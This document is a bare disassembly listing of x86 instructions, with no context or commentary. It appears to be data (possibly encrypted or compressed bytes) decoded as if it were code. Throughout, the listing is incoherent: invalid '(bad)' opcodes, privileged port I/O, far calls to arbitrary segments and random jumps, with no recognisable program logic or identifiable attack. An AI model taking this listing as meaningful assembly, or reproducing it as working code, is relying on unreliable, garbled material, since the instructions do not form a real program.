  408b8b:	retf   
  408b8c:	into   
  408b8d:	ja     0x408b4e
  408b8f:	pop    edx
  408b90:	imul   ebx,DWORD PTR [edi+0x8],0x40
  408b94:	or     eax,DWORD PTR [edi-0x6d]
  408b97:	leave  
  408b98:	mov    eax,0xda396004
  408b9d:	inc    esp
  408b9e:	or     al,0x7d
  408ba0:	mov    cl,0x43
  408ba2:	mov    dh,0xab
  408ba4:	(bad)  
  408ba5:	sbb    ah,dl
  408ba7:	xchg   BYTE PTR [ecx+0x34],al
  408baa:	mov    dh,BYTE PTR [eax-0x7ad2f31a]
  408bb0:	hlt    
  408bb1:	inc    edx
  408bb2:	out    0xd1,eax
  408bb4:	les    ebx,FWORD PTR [ecx]
  408bb6:	sahf   
  408bb7:	xor    al,0x33
  408bb9:	jg     0x408bac
  408bbb:	xor    BYTE PTR [esi-0x400c4ea9],0xec
  408bc2:	mov    edi,0x510c9919
  408bc7:	in     al,0xd1
  408bc9:	outs   dx,BYTE PTR ds:[esi]
  408bca:	cmp    BYTE PTR [esi+0x54d2cd32],cl
  408bd0:	add    BYTE PTR [edx-0x2bb2b901],cl
  408bd6:	cmp    bh,bl
  408bd8:	adc    BYTE PTR [edx+0x6a],dl
  408bdb:	popa   
  408bdc:	cmp    eax,0xd1767ad5
  408be1:	lahf   
  408be2:	or     eax,0x41592968
  408be7:	leave  
  408be8:	mov    ebp,0xcc0256f0
  408bed:	dec    edx
  408bee:	stos   BYTE PTR es:[edi],al
  408bef:	hlt    
  408bf0:	mov    ebx,0xf91a3dd6
  408bf5:	adc    ah,ah
  408bf7:	push   ebp
  408bf8:	mov    ch,BYTE PTR [ebp-0x42895fb1]
  408bfe:	in     eax,0x16
  408c00:	leave  
  408c01:	es add al,0xd2
  408c04:	mov    edi,0x748ab85
  408c09:	and    DWORD PTR cs:[edx+0x41],0xd39329be
  408c11:	das    
  408c12:	jo     0x408c8c
  408c14:	mov    ds:0xbc4ce2c3,al
  408c19:	push   es
  408c1a:	sar    DWORD PTR [esi],0xd5
  408c1d:	xor    esi,DWORD PTR [esi]
  408c1f:	je     0x408bb8
  408c21:	jb     0x408c2d
  408c23:	dec    esi
  408c24:	or     cl,BYTE PTR [eax+0x6b]
  408c27:	push   es
  408c28:	add    eax,0xbf6acd28
  408c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c2e:	push   esp
  408c2f:	dec    edx
  408c30:	shl    DWORD PTR [edx],cl
  408c32:	out    dx,eax
  408c33:	sub    cl,dh
  408c35:	mov    edi,0x61ffe152
  408c3a:	scas   eax,DWORD PTR es:[edi]
  408c3b:	dec    ecx
  408c3c:	xchg   edi,eax
  408c3d:	fs jge 0x408cb0
  408c40:	jecxz  0x408c51
  408c42:	dec    edi
  408c43:	je     0x9bcef432
  408c49:	ins    BYTE PTR es:[edi],dx
  408c4a:	sub    al,0xe9
  408c4c:	sahf   
  408c4d:	inc    ebx
  408c4e:	mov    bl,0x44
  408c50:	cs mov edx,0xa654b727
  408c56:	mov    al,0x69
  408c58:	adc    eax,DWORD PTR [ebx]
  408c5a:	add    DWORD PTR [ecx+0x50],edi
  408c5d:	std    
  408c5e:	jge    0x408c97
  408c60:	xlat   BYTE PTR ds:[ebx]
  408c61:	pop    eax
  408c62:	outs   dx,BYTE PTR ds:[esi]
  408c63:	loop   0x408c9c
  408c65:	outs   dx,BYTE PTR ds:[esi]
  408c66:	call   0x220d:0x442aa369
  408c6d:	jnp    0x408cd2
  408c6f:	(bad)  
  408c70:	call   0xa712:0x49ea4b95
  408c77:	push   edi
  408c79:	adc    ch,BYTE PTR [ebx+0x5e]
  408c7c:	pusha  
  408c7d:	adc    DWORD PTR [edx-0x14],edx
  408c80:	aaa    
  408c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c82:	and    dh,al
  408c84:	int3   
  408c85:	add    BYTE PTR [edx+edi*4],bl
  408c88:	movd   DWORD PTR cs:[eax],mm6
  408c8c:	pop    ss
  408c8d:	sbb    ebx,DWORD PTR [edx-0x57]
  408c90:	hlt    
  408c91:	lds    ebx,FWORD PTR ds:0xf47edb98
  408c97:	mov    ss,WORD PTR [ebx]
  408c99:	ja     0x408c33
  408c9b:	sbb    DWORD PTR [ecx+0x2],edi
  408c9e:	out    dx,al
  408c9f:	je     0x408c59
  408ca1:	xchg   ebp,eax
  408ca2:	lahf   
  408ca3:	bound  ecx,QWORD PTR [esi+0x5d]
  408ca6:	xchg   edi,eax
  408ca7:	std    
  408ca8:	or     ch,BYTE PTR [edx-0xf47c66d]
  408cae:	xor    al,0x9d
  408cb0:	sbb    eax,0xa2321e51
  408cb5:	fcmovnu st,st(4)
  408cb7:	adc    edx,DWORD PTR [ebx-0x1e56aba0]
  408cbd:	in     eax,dx
  408cbe:	ds push 0x4935379e
  408cc4:	xor    cl,BYTE PTR [ebx]
  408cc6:	inc    esi
  408cc7:	or     DWORD PTR [edx+esi*1+0x62625ce6],esi
  408cce:	mov    al,0x9
  408cd0:	call   0x47f2:0x6a77e434
  408cd7:	cli    
  408cd8:	dec    edi
  408cd9:	xor    ch,bl
  408cdb:	sub    al,0xbe
  408cdd:	add    eax,0xbddbd4cf
  408ce2:	dec    eax
  408ce3:	call   0x82df7d54
  408ce8:	xlat   BYTE PTR ds:[ebx]
  408ce9:	test   eax,0x7b29b959
  408cee:	test   DWORD PTR [edx],0xa7d6dec5
  408cf4:	shr    cl,1
  408cf6:	jb     0x408cde
  408cf8:	jecxz  0x408cba
  408cfa:	je     0x408d67
  408cfc:	adc    ebx,DWORD PTR [ecx-0x49]
  408cff:	out    dx,eax
  408d00:	push   ebp
  408d01:	je     0x408d0d
  408d03:	dec    edx
  408d04:	xchg   esi,eax
  408d05:	jo     0x408cfc
  408d07:	pop    ecx
  408d08:	cld    
  408d09:	jmp    0xfd56:0x36b006d9
  408d10:	push   DWORD PTR [eax+0x28300369]
  408d16:	xchg   BYTE PTR [ecx+0x75678cd0],dl
  408d1c:	ffree  st(2)
  408d1e:	vrcpss xmm6,xmm7,DWORD PTR [eax+esi*4-0x21]
  408d24:	jb     0x408cd2
  408d26:	sub    al,0x2d
  408d28:	push   ebp
  408d29:	jge    0x408d0d
  408d2b:	add    eax,0x468b5879
  408d30:	iret   
  408d31:	das    
  408d32:	sbb    bh,BYTE PTR [eax]
  408d34:	call   0xd2fe9a1f
  408d39:	or     ecx,DWORD PTR [esi+0x16c3eeb9]
  408d3f:	jne    0x408cd2
  408d41:	js     0x408db5
  408d43:	sub    BYTE PTR [edi],dl
  408d45:	and    eax,0x34a9b9b
  408d4a:	mov    edx,DWORD PTR [edi-0x58]
  408d4d:	out    dx,al
  408d4e:	sub    eax,0x3859e1df
  408d53:	test   eax,0x1ceaccc0
  408d58:	cmp    al,0xc
  408d5a:	mov    ecx,0x25a048a2
  408d5f:	fdiv   QWORD PTR es:[ebp-0x67897548]
  408d66:	mov    ah,0xca
  408d68:	jg     0x408d99
  408d6a:	mov    DWORD PTR [ecx],ecx
  408d6c:	push   ds
  408d6d:	mov    edi,?
  408d6f:	fmulp  st(3),st
  408d71:	test   al,0x65
  408d73:	fist   WORD PTR [edi+0x48df4eee]
  408d79:	dec    ebp
  408d7a:	or     DWORD PTR [esi+ebp*8+0x659db486],edx
  408d81:	mov    al,ds:0xabfcea90
  408d86:	or     eax,edx
  408d88:	inc    esp
  408d89:	xchg   edi,eax
  408d8a:	and    bl,BYTE PTR [ebx]
  408d8c:	adc    DWORD PTR [esi+0xf23f5b3],ecx
  408d92:	or     al,0x2a
  408d94:	mov    edx,0x67e3483c
  408d99:	mov    ebx,0x598316cb
  408d9e:	sub    BYTE PTR [edx],cl
  408da0:	pusha  
  408da1:	cs mov dl,0x3d
  408da4:	sbb    eax,0x9914af85
  408da9:	mov    eax,ds:0xf8450d60
  408dae:	(bad)  
  408daf:	hlt    
  408db0:	cs cli 
  408db2:	push   ds
  408db3:	aaa    
  408db4:	jge    0x408d82
  408db6:	xor    eax,0x789feff2
  408dbb:	retf   0xb812
  408dbe:	mov    al,ds:0x53412f04
  408dc3:	stc    
  408dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc5:	das    
  408dc6:	cli    
  408dc7:	sbb    DWORD PTR [ecx+0x66],ebx
  408dca:	xchg   ebx,eax
  408dcb:	cmp    edi,DWORD PTR [eax+0x5e4d7f1d]
  408dd1:	cmp    DWORD PTR [ebx+0x2],0xffffffe6
  408dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dd6:	rol    ebx,1
  408dd8:	xlat   BYTE PTR ds:[ebx]
  408dd9:	mov    eax,0x529042db
  408dde:	fsubrp st(5),st
  408de0:	cs repz test eax,0xcdd066d
  408de7:	shl    BYTE PTR [edi+0x13f308ef],1
  408ded:	out    0x91,eax
  408def:	push   edi
  408df0:	test   cl,0x11
  408df3:	ins    BYTE PTR es:[edi],dx
  408df4:	jbe    0x408d95
  408df6:	sub    DWORD PTR [ebx+edx*4-0x6790823e],edi
  408dfd:	or     BYTE PTR [ebx+0x67f829b7],ch
  408e03:	mov    al,0xad
  408e05:	ds pusha 
  408e07:	bnd js 0x408dc2
  408e0a:	sbb    al,0x48
  408e0c:	add    BYTE PTR [eax-0x53],ch
  408e0f:	jne    0x408dc0
  408e11:	dec    ecx
  408e12:	pop    eax
  408e13:	xchg   edi,eax
  408e14:	sbb    eax,0xd3c1e16b
  408e19:	add    bl,BYTE PTR [ecx+0x3a]
  408e1c:	imul   ebp,DWORD PTR [ecx-0x79],0x2d
  408e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e21:	out    dx,eax
  408e22:	repz ret 0x96b3
  408e26:	xchg   ebx,eax
  408e27:	jne    0x408e6a
  408e29:	jg     0x408e71
  408e2b:	xor    bl,BYTE PTR [ebp-0x70bf4dd]
  408e31:	clc    
  408e32:	dec    esi
  408e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e34:	mov    ecx,0xea3117fe
  408e39:	add    eax,0x4d844c61
  408e3e:	jnp    0x408e61
  408e40:	loope  0x408dda
  408e42:	mov    ebp,0x1199613a
  408e47:	cmp    BYTE PTR [edi-0x696d4792],bl
  408e4d:	repnz cs push es
  408e50:	div    bl
  408e52:	xchg   edi,eax
  408e53:	or     eax,0xa0aff2f8
  408e58:	xor    DWORD PTR [esi-0x18],ecx
  408e5b:	shl    BYTE PTR [ecx-0x73],1
  408e5e:	jle    0x408e5c
  408e60:	mov    ah,0x36
  408e62:	imul   eax,DWORD PTR [ecx-0x74],0x6c3fda6c
  408e69:	js     0x408e4e
  408e6b:	jge    0x408e10
  408e6d:	ss add eax,0x1a72f384
  408e73:	outs   dx,DWORD PTR ds:[esi]
  408e74:	je     0x408e08
  408e76:	cmp    al,BYTE PTR [ebx+0x25]
  408e79:	xchg   esp,eax
  408e7a:	fisttp DWORD PTR [edx]
  408e7c:	add    al,0xb
  408e7e:	push   edi
  408e7f:	clc    
  408e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e81:	add    bh,BYTE PTR [ebx-0x7]
  408e84:	fidivr DWORD PTR [edi+0x3e1b80fc]
  408e8a:	test   al,0x7f
  408e8c:	dec    ebp
  408e8d:	xchg   edx,eax
  408e8e:	xor    BYTE PTR [edx+0x5abe90df],dh
  408e94:	pop    ebx
  408e95:	outs   dx,DWORD PTR ds:[esi]
  408e96:	pop    esi
  408e97:	cmp    BYTE PTR [eax-0x209ec6e5],0xde
  408e9e:	push   0x67d8f476
  408ea3:	pop    esp
  408ea4:	dec    edi
  408ea5:	push   edx
  408ea6:	adc    ebp,DWORD PTR [edx-0x2a]
  408ea9:	xor    eax,0x376563a9
  408eae:	arpl   WORD PTR [esi+0xc36a1e0],sp
  408eb4:	int    0xe2
  408eb6:	scas   al,BYTE PTR es:[edi]
  408eb7:	fwait
  408eb8:	(bad)
  408ebb:	test   eax,0x3e505f7c
  408ec0:	mov    DWORD PTR [ebp+0x20e09c47],ebp
  408ec6:	cwde   
  408ec7:	mov    bl,0x6e
  408ec9:	ret    0x3e37
  408ecc:	push   es
  408ecd:	leave  
  408ece:	fadd   st(4),st
  408ed0:	cdq    
  408ed1:	retf   
  408ed2:	cs pusha 
  408ed4:	mov    bl,0x89
  408ed6:	mov    dl,0xb1
  408ed8:	inc    edi
  408ed9:	pusha  
  408eda:	stc    
  408edb:	xchg   edi,eax
  408edc:	into   
  408edd:	popa   
  408ede:	cmp    al,0x38
  408ee0:	cmp    DWORD PTR [edi-0x2e5701a1],ebx
  408ee6:	add    ebp,DWORD PTR [eax]
  408ee8:	sbb    edx,eax
  408eea:	fld    QWORD PTR [ecx+0x51]
  408eed:	call   0x99e3dc9f
  408ef2:	test   BYTE PTR [ecx+0x5721dfe9],0xca
  408ef9:	and    eax,0xdf4185b
  408efe:	mov    bh,0x8c
  408f00:	and    DWORD PTR [ecx+0x1669bf95],0x1b
  408f07:	sub    dh,BYTE PTR [ebx]
  408f09:	lods   eax,DWORD PTR ds:[esi]
  408f0a:	cli    
  408f0b:	push   edi
  408f0c:	push   ebp
  408f0d:	cmp    BYTE PTR [esi],ah
  408f0f:	ret    0x9eee
  408f12:	inc    eax
  408f13:	or     BYTE PTR [ecx],cl
  408f15:	add    eax,0xe51290e3
  408f1a:	cdq    
  408f1b:	xchg   edi,eax
  408f1c:	or     eax,0xa02403a1
  408f21:	mov    ebp,0x927d09fa
  408f26:	and    al,0xfe
  408f28:	jmp    0x7cf:0x51698999
  408f2f:	cmp    edi,0x88575e25
  408f35:	inc    ecx
  408f36:	xor    esp,eax
  408f38:	sqrtps xmm1,XMMWORD PTR [esp+eiz*4]
  408f3c:	and    esi,DWORD PTR [eax-0x7d]
  408f3f:	ins    BYTE PTR es:[edi],dx
  408f40:	add    al,0xcb
  408f42:	int    0x54
  408f44:	fnstcw WORD PTR [eax-0x3d]
  408f47:	and    dh,BYTE PTR [edx+0x4f]
  408f4a:	dec    ecx
  408f4b:	stos   BYTE PTR es:[edi],al
  408f4c:	(bad)  
  408f4d:	pop    ebp
  408f4e:	ffreep st(0)
  408f50:	or     edi,DWORD PTR [edi+0xb]
  408f53:	mov    WORD PTR [eax+0x36],?
  408f56:	clc    
  408f57:	ja     0x408f27
  408f59:	outs   dx,DWORD PTR ds:[esi]
  408f5a:	xor    DWORD PTR [edx-0x45dddab9],edi
  408f60:	or     ch,BYTE PTR ds:0x8c577663
  408f66:	add    BYTE PTR [edx],dh
  408f68:	and    DWORD PTR gs:[edi-0x9a491d4],ebx
  408f6f:	rcl    BYTE PTR [esi+0x608aa565],cl
  408f75:	enter  0x23bd,0xfe
  408f79:	cmp    ebx,DWORD PTR [edi-0x22]
  408f7c:	xor    DWORD PTR [edi+ebp*8+0x38908c8],ebx
  408f83:	(bad)  
  408f84:	in     al,dx
  408f85:	imul   edx,DWORD PTR [ebx],0xffffff8a
  408f88:	mov    bh,0xac
  408f8a:	add    eax,0xaa6f71a0
  408f8f:	imul   esp,DWORD PTR [eax],0x24
  408f92:	sbb    BYTE PTR [edx+0x7543e919],cl
  408f98:	hlt    
  408f99:	jl     0x408fe8
  408f9b:	xor    al,0xf9
  408f9d:	xchg   ebx,eax
  408f9e:	sbb    esp,ebx
  408fa0:	int3   
  408fa1:	mov    bh,BYTE PTR [eax-0x57]
  408fa4:	in     al,dx
  408fa5:	jmp    0x18985941
  408faa:	jge    0x48d8e86e
  408fb0:	aaa    
  408fb1:	dec    esi
  408fb2:	xchg   esp,eax
  408fb3:	pop    esp
  408fb4:	sub    eax,0x40a01f5a
  408fb9:	leave  
  408fba:	lahf   
  408fbb:	aas    
  408fbc:	in     al,dx
  408fbd:	mov    al,ds:0xb2da1ed0
  408fc2:	test   dh,ch
  408fc4:	jne    0x408ff3
  408fc6:	mov    WORD PTR [edx-0xe],?
  408fc9:	aas    
  408fca:	mov    al,BYTE PTR [eax]
  408fcc:	jmp    0x12e6633a
  408fd1:	stos   BYTE PTR es:[edi],al
  408fd2:	pop    edi
  408fd3:	sbb    DWORD PTR ds:0x8ed8ec13,ebp
  408fd9:	into   
  408fda:	test   al,0xbd
  408fdc:	loopne 0x408fbc
  408fde:	cmp    al,BYTE PTR [edi+0xd]
  408fe1:	das    
  408fe2:	xor    DWORD PTR [edx-0x6b],ebx
  408fe5:	cli    
  408fe6:	jmp    0x6af6:0x9e07f36b
  408fed:	add    ch,BYTE PTR [ecx+0x35d7caf8]
  408ff3:	int    0xe8
  408ff5:	fldcw  WORD PTR [esi-0x38]
  408ff8:	xchg   ebx,eax
  408ff9:	les    ebx,FWORD PTR [edi]
  408ffb:	aam    0xc5
  408ffd:	mov    esi,0x261a97de
  409002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409004:	sub    eax,0xeb162829
  409009:	pop    ds
  40900a:	retf   
  40900b:	lods   eax,DWORD PTR ds:[esi]
  40900c:	lods   al,BYTE PTR ds:[esi]
  40900d:	xchg   bh,al
  40900f:	cmp    ebp,ebp
  409011:	das    
  409012:	ja     0x409014
  409014:	dec    esi
  409015:	add    cl,BYTE PTR [ebx+0xa]
  409018:	icebp  
  409019:	sbb    al,0x0
  40901b:	xchg   edx,eax
  40901c:	dec    esi
  40901d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40901e:	call   0xab88:0xefc1c8c2
  409025:	mov    ds:0xf3653026,al
  40902a:	push   ebx
  40902b:	ret    0x5ebe
  40902e:	enter  0x6d26,0x71
  409032:	in     al,dx
  409033:	cdq    
  409034:	push   es
  409035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409036:	retf   0x5332
  409039:	pop    eax
  40903a:	fmul   QWORD PTR [esi+0x70]
  40903d:	fwait
  40903e:	xchg   esi,eax
  40903f:	mov    edi,0xafdb4adf
  409044:	in     al,dx
  409045:	popa   
  409046:	pop    edx
  409047:	or     al,0x18
  409049:	xchg   BYTE PTR [ecx-0x7a],bh
  40904c:	sbb    al,0xff
  40904e:	mov    ah,0x6a
  409050:	mov    ah,0x74
  409052:	ss jbe 0x40901a
  409055:	(bad)  
  409056:	loop   0x4090a4
  409058:	ins    DWORD PTR es:[edi],dx
  409059:	data16 (bad) 
  40905b:	xlat   BYTE PTR ds:[ebx]
  40905c:	into   
  40905d:	inc    edi
  40905e:	or     BYTE PTR [esi],0xe8
  409061:	cmp    dh,BYTE PTR [ecx+0x7c2fbe0d]
  409067:	sub    edi,DWORD PTR [esi]
  409069:	aaa    
  40906a:	mov    esp,DWORD PTR [ecx-0x52653914]
  409070:	fsub   QWORD PTR [ebx+0x26f130b6]
  409076:	lods   al,BYTE PTR ds:[esi]
  409077:	fidiv  DWORD PTR [edi-0x4a80b5ca]
  40907d:	jmp    0x1412f7a0
  409082:	jecxz  0x4090fd
  409084:	push   es
  409085:	test   DWORD PTR [esi],ecx
  409087:	aas    
  409088:	push   edi
  409089:	sbb    eax,0xf0203088
  40908e:	outs   dx,BYTE PTR ds:[esi]
  40908f:	or     DWORD PTR [ebp+ebx*2-0x1b08735c],ebp
  409096:	or     eax,0x6212f6bd
  40909b:	jmp    0x7286:0xf1bd1a87
  4090a2:	test   eax,0x3a715da6
  4090a7:	shl    DWORD PTR [esi+0x14],0x13
  4090ab:	mov    esp,0x3da7b477
  4090b0:	sbb    al,0x95
  4090b2:	fbstp  TBYTE PTR [edi-0x24]
  4090b5:	imul   esi,DWORD PTR [eax],0xffffffa6
  4090b8:	pop    esi
  4090b9:	(bad)  
  4090ba:	and    eax,0xde56b065
  4090bf:	inc    eax
  4090c0:	test   eax,0x6ec999c4
  4090c5:	mov    al,ds:0x82e05ae9
  4090ca:	repz or ch,BYTE PTR [edx+ebp*1]
  4090ce:	sbb    eax,0xb340534b
  4090d3:	push   ss
  4090d4:	fdivr  DWORD PTR [eax*4-0x3477a2c1]
  4090db:	cmp    BYTE PTR [ebx-0x3],al
  4090de:	neg    BYTE PTR [eax]
  4090e0:	mov    es,WORD PTR [edx-0x5b]
  4090e3:	xchg   esp,eax
  4090e4:	xlat   BYTE PTR ds:[ebx]
  4090e5:	popa   
  4090e6:	sub    BYTE PTR [ebp-0x38883a76],cl
  4090ec:	popa   
  4090ed:	sbb    cl,0x3b
  4090f0:	push   0xa590df03
  4090f5:	jle    0x4090b6
  4090f7:	iret   
  4090f8:	xchg   BYTE PTR [edx-0x5c],al
  4090fb:	jmp    0x409122
  4090fd:	mov    ah,0xd6
  4090ff:	sbb    bl,BYTE PTR ds:0x67f3779f
  409105:	xchg   edi,eax
  409106:	ret    0x5390
  409109:	aas    
  40910a:	or     BYTE PTR [edi+0x7a],ch
  40910d:	push   cs
  40910e:	test   BYTE PTR [eax-0x71],0xc5
  409112:	jecxz  0x409107
  409114:	addr16 add al,0x4b
  409117:	xor    dl,BYTE PTR [ecx+0x546d7537]
  40911d:	mov    ds:0x7f65bc9,al
  409122:	retf   
  409123:	ret    0x6ce2
  409126:	xlat   BYTE PTR ds:[ebx]
  409127:	dec    ebx
  409128:	in     al,dx
  409129:	leave  
  40912a:	fsub   QWORD PTR [edx-0x30]
  40912d:	fnstsw WORD PTR [esi]
  40912f:	out    0x49,al
  409131:	jp     0x4091a7
  409133:	(bad)  
  409134:	cld    
  409135:	nop
  409136:	or     al,BYTE PTR [ecx+0x7fc62c1b]
  40913c:	add    al,al
  40913e:	fs push edi
  409140:	sbb    DWORD PTR [edx],0xe55fcb22
  409146:	cmp    eax,0x6d2eb37c
  40914b:	mov    edx,0xfb44c3e0
  409150:	mov    DWORD PTR [esi],eax
  409152:	mov    esp,0xfe8fe7fd
  409157:	stc    
  409158:	dec    ebx
  409159:	jne    0x40919b
  40915b:	push   ebx
  40915c:	lods   eax,DWORD PTR ds:[esi]
  40915d:	mov    edi,DWORD PTR [edx]
  40915f:	arpl   bx,sp
  409161:	lea    ecx,[esi]
  409163:	popa   
  409164:	test   BYTE PTR [esi+edi*4+0x3eed4feb],bh
  40916b:	nop
  40916c:	or     edi,DWORD PTR [ebp+0x4f]
  40916f:	dec    eax
  409170:	popa   
  409171:	adc    ch,cl
  409173:	adc    edx,DWORD PTR [edx]
  409175:	imul   esp,DWORD PTR [edx+edx*1-0x7d8580fd],0xffffffaa
  40917d:	repnz mov bh,0x8f
  409180:	hlt    
  409181:	ja     0x4091dd
  409183:	push   edi
  409184:	leave  
  409185:	xchg   esp,eax
  409186:	in     al,0x21
  409188:	dec    esp
  409189:	and    DWORD PTR [ebx+0x70],esi
  40918c:	mov    edx,DWORD PTR ss:[edi+0x50902574]
  409193:	sub    eax,0x4a7f98b2
  409198:	fs cdq 
  40919a:	adc    ch,BYTE PTR [ebp+0x3a88b11c]
  4091a0:	call   0x29a923bb
  4091a5:	and    DWORD PTR [ebx],edi
  4091a7:	push   esp
  4091a8:	pop    ecx
  4091a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091aa:	mov    ecx,0x6c68f2ea
  4091af:	es jb  0x4091c6
  4091b2:	rcl    DWORD PTR [edx-0x5d],cl
  4091b5:	xchg   ax,ax
  4091b7:	push   ebx
  4091b8:	sub    eax,0x91203c81
  4091bd:	sub    eax,0xa1c31d59
  4091c2:	push   edx
  4091c3:	lock cdq 
  4091c5:	(bad)  [edx]
  4091c7:	lock (bad) 
  4091c9:	rep stos DWORD PTR es:[edi],eax
  4091cb:	mov    ah,0x8
  4091cd:	inc    esi
  4091ce:	inc    edx
  4091cf:	test   eax,0xcc2784b3
  4091d4:	in     eax,dx
  4091d5:	push   edx
  4091d6:	pop    DWORD PTR [edi+ebx*1-0x7a1d9370]
  4091dd:	stos   BYTE PTR es:[edi],al
  4091de:	(bad)  
  4091df:	daa    
  4091e0:	add    BYTE PTR [edx],dl
  4091e2:	pusha  
  4091e3:	add    BYTE PTR [ecx-0x4a],al
  4091e6:	sahf   
  4091e7:	nop
  4091e8:	arpl   WORD PTR [ebp-0x3d2d67e0],sp
  4091ee:	in     al,0x8a
  4091f0:	sub    eax,0x2ea2aebc
  4091f5:	jl     0x409266
  4091f7:	sbb    al,0x9b
  4091f9:	mov    dl,0x3f
  4091fb:	jnp    0x409212
  4091fd:	js     0x409245
  4091ff:	pop    esi
  409200:	sti    
  409201:	cmp    eax,0xf30c5839
  409206:	pop    ds
  409207:	adc    al,0xb9
  409209:	mov    ah,0xfb
  40920b:	mov    bl,0x5b
  40920d:	inc    ebp
  40920e:	dec    ebx
  40920f:	push   ebp
  409210:	rep lods eax,DWORD PTR ds:[esi]
  409212:	mov    ss,WORD PTR [edx-0x47]
  409215:	jmp    0xf5ab81f4
  40921a:	xor    DWORD PTR [esi+0x52],eax
  40921d:	adc    esi,DWORD PTR [edx+esi*1-0xc]
  409221:	push   esp
  409222:	fdivr  st,st(7)
  409224:	jecxz  0x4091f3
  409226:	push   ss
  409227:	xchg   BYTE PTR [edx-0x7b],cl
  40922a:	pusha  
  40922b:	jmp    FWORD PTR [edi+0x2b9de9c6]
  409231:	jb     0x40924a
  409233:	fld    TBYTE PTR [ebp-0x1c]
  409236:	jno    0x4091ee
  409238:	outs   dx,BYTE PTR ds:[esi]
  409239:	sub    al,BYTE PTR ds:0x49eeb8c9
  40923f:	cdq    
  409240:	xor    DWORD PTR [esi+0x1d],ebx
  409243:	ret    0x683a
  409246:	mov    dh,0x3e
  409248:	jle    0x40922b
  40924a:	mov    ch,0xef
  40924c:	sbb    eax,0x4752eaa2
  409251:	mov    bh,0x60
  409253:	and    BYTE PTR [ecx],al
  409255:	mov    ecx,0xb8e44820
  40925a:	pop    esp
  40925b:	imul   ebx,DWORD PTR [esp+ebx*1+0xe],0x1a70283e
  409263:	test   eax,0x7750ae44
  409268:	cli    
  409269:	push   edx
  40926a:	mov    ch,0xe
  40926c:	outs   dx,BYTE PTR ds:[esi]
  40926d:	cld    
  40926e:	fisub  DWORD PTR [esi]
  409270:	push   eax
  409271:	xchg   esi,eax
  409272:	in     al,dx
  409273:	fdivr  st,st(0)
  409275:	addr16 cli 
  409277:	out    dx,al
  409278:	push   es
  409279:	xchg   edx,eax
  40927a:	and    eax,0xe480978c
  40927f:	test   eax,0x3381e445
  409284:	mov    ebx,0x5811d7d8
  409289:	pop    edx
  40928a:	std    
  40928b:	fldenv [esi-0x8db7026]
  409291:	add    al,0x75
  409293:	dec    eax
  409294:	jmp    0x125faae8
  409299:	mov    edx,0xeb2a7146
  40929e:	and    al,BYTE PTR [edi]
  4092a0:	arpl   WORD PTR [esi],ax
  4092a2:	lods   al,BYTE PTR ds:[esi]
  4092a3:	mov    ss,WORD PTR [ecx+0x734138cc]
  4092a9:	sbb    cl,bh
  4092ab:	shr    BYTE PTR [ebx-0x1f],0xd0
  4092af:	or     BYTE PTR [eax+0x72],ch
  4092b2:	sbb    eax,0x2132fe42
  4092b7:	inc    ebx
  4092b8:	xor    al,0x63
  4092ba:	cmp    edx,ebp
  4092bc:	scas   al,BYTE PTR es:[edi]
  4092bd:	inc    edi
  4092be:	mov    cl,0x24
  4092c0:	dec    eax
  4092c1:	sti    
  4092c2:	add    ah,0x9e
  4092c5:	dec    ecx
  4092c6:	mov    edi,0x372dc905
  4092cb:	inc    eax
  4092cc:	mov    esi,DWORD PTR [esi+0x1c12cf1b]
  4092d2:	popa   
  4092d3:	jg     0x40925e
  4092d5:	mov    eax,0x6946f41f
  4092da:	add    DWORD PTR [ecx+0x612d2764],0xe9a11977
  4092e4:	dec    esp
  4092e5:	repnz sbb al,0x8d
  4092e8:	jo     0x40926a
  4092ea:	jg     0x409276
  4092ec:	in     eax,dx
  4092ed:	dec    esi
  4092ee:	inc    edi
  4092ef:	lods   eax,DWORD PTR ds:[esi]
  4092f0:	or     ebx,ebx
  4092f2:	or     DWORD PTR [edx],ecx
  4092f4:	mov    ebp,DWORD PTR [ebx-0x1ade057c]
  4092fa:	ins    BYTE PTR es:[edi],dx
  4092fb:	add    eax,ebp
  4092fd:	sub    eax,0x175648d5
  409302:	out    0xe,eax
  409304:	imul   BYTE PTR [edx-0x7afcc7ea]
  40930a:	std    
  40930b:	pop    eax
  40930c:	popa   
  40930d:	push   esi
  40930e:	aaa    
  40930f:	adc    al,0x7c
  409311:	cmp    edx,ecx
  409313:	push   ebp
  409314:	fdiv   DWORD PTR ds:0x25886ed8
  40931a:	xor    eax,0x23a35d56
  40931f:	ss fwait
  409321:	or     cl,BYTE PTR [ebx*4-0xe3b27d3]
  409328:	xchg   esp,eax
  409329:	fwait
  40932a:	cmp    DWORD PTR [edi+0x32],edx
  40932d:	mov    edx,0xf161bb37
  409332:	and    esp,ebx
  409334:	nop
  409335:	leave  
  409336:	or     ebx,0xcdb0ad2e
  40933c:	mov    bh,0x6c
  40933e:	ret    
  40933f:	(bad)  
  409340:	pop    ebp
  409341:	leave  
  409342:	xchg   ecx,eax
  409343:	aas    
  409344:	or     esi,DWORD PTR [ebp+0x296db416]
  40934a:	ja     0x4093c8
  40934c:	push   0x36
  40934e:	ss mul al
  409351:	clc    
  409352:	pop    eax
  409353:	inc    ebp
  409354:	clc    
  409355:	leave  
  409356:	mov    dl,0x21
  409358:	pop    esi
  409359:	jmp    0x40938f
  40935b:	add    bh,BYTE PTR [eax]
  40935d:	(bad)  
  40935e:	xor    edi,ecx
  409360:	pop    eax
  409361:	sar    BYTE PTR ds:0x965c5031,1
  409367:	outs   dx,DWORD PTR ds:[esi]
  409368:	cmp    bh,0x55
  40936b:	int3   
  40936c:	fdiv   QWORD PTR [edi+0x23]
  40936f:	test   al,0xa4
  409371:	and    al,0x16
  409373:	mov    edx,0xa681da81
  409378:	fdiv   DWORD PTR [ecx-0x4a]
  40937b:	add    bl,al
  40937d:	dec    esi
  40937e:	xor    BYTE PTR [edx+0x4d49e7b8],al
  409384:	inc    eax
  409385:	out    0xfd,al
